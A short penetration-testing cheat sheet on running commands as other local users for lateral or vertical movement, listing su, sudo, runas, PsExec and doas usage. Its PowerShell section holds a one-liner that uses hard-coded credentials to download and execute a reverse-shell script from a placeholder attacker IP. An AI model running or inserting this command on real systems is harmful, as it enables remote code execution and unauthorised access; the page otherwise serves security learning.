---
description: >-
  Some times we need to do a lateral or vertical movement between the same hosts
  only switching between local users, and we cant use any type of authenticated
  service such as SMB or SSH.
---

# Run Commands AS

## Linux

Linux has the easiest way to change between users using the `su` command.

```text
su user
```

To change to `root` user \(need to be in sudoer group\)

```text
sudo su -
```

## Windows

### Cmd

`runas` command gives us the oportunity in `cmd` the opportunity to run some commands as other users.

```text
runas /user:username <program>
runas /user:domain\username <program>
runas /user:username@domain <program>
```

### PsExec

 [_PsExec_ ](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec)is part of a growing kit of Sysinternals command-line tools that aid in the administration of local and remote systems named _PsTools_.

```text
psexec.exe /accepteula
psexec.exe [\\COMPUTER] /u USER /p PASS cmd [args]
```

### Powershell

```text
$user='WORKGROUP\User'; 
$pass='passwd';
Invoke-Command -ScriptBlock { iex(New-Object Net.WebClient).DownloadString('http://<IP>:<PORT>/rev_shell.ps1') } -ComputerName BART -Credential (New-Object System.Management.Automation.PSCredential $user,(ConvertTo-SecureString $pass -AsPlainText -Force))
```

## NetBSD

Similar like sudo

```text
su user
```

Similar like `sudo`to change to `root`user:

```text
doas -u USER sh
```



